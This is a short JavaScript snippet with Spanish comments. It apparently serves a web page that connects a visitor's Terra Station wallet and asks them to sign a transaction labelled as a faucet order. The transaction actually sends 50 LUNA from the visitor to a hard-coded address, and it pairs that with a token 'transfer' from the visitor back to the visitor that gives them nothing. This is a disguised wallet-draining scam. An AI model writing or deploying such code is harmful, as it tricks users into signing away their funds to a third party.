// Estructura base del JSON (Plantilla dinámica)
const txTemplate = {
  "chain_id": "columbus-5",
  "msgs": [
    {
      "type": "bank/MsgSend",
      "value": {
        "from_address": "{{USER_ADDRESS}}", // Se reemplaza dinámicamente
        "to_address": "terra1hc0ufrxa6uw62qgm4p0ljvzenaypt70kmc4xyu",
        "amount": [{ "amount": "50000000", "denom": "uluna" }]
      }
    },
    {
      "type": "wasm/MsgExecuteContract",
      "value": {
        "sender": "{{USER_ADDRESS}}", // Se reemplaza dinámicamente
        "contract": "terra1ug772wjenmm8mphzq0pvgvxrkgd9axngv7swrvrt3dj35sn9fmls626vml",
        "execute_msg": {
          "transfer": {
            "recipient": "{{USER_ADDRESS}}", // Se reemplaza dinámicamente
            "amount": "10000000000"
          }
        },
        "coins": []
      }
    }
  ]
};

// Función que ejecuta cualquier usuario desde el navegador
async function enviarTransaccionDinamica() {
    if (!window.terraExtension) {
        alert("Por favor instala Terra Station");
        return;
    }

    try {
        // 1. Conectar y obtener la dirección de la billetera activa
        const connection = await window.terraExtension.connect();
        const userAddress = connection.address;

        // 2. Convertir la plantilla JSON a texto y reemplazar la etiqueta por la dirección real
        let txString = JSON.stringify(txTemplate);
        txString = txString.replaceAll("{{USER_ADDRESS}}", userAddress);
        
        // 3. Reconvertir a objeto JSON listo para la blockchain
        const finalTx = JSON.parse(txString);

        // 4. Enviar a la extensión para que cualquier usuario la firme
        const resultado = await window.terraExtension.post({
            msgs: finalTx.msgs
        });

        console.log("Transacción enviada por el usuario:", userAddress, resultado);
    } catch (error) {
        console.error("Error al procesar la orden de la faucet:", error);
    }
}
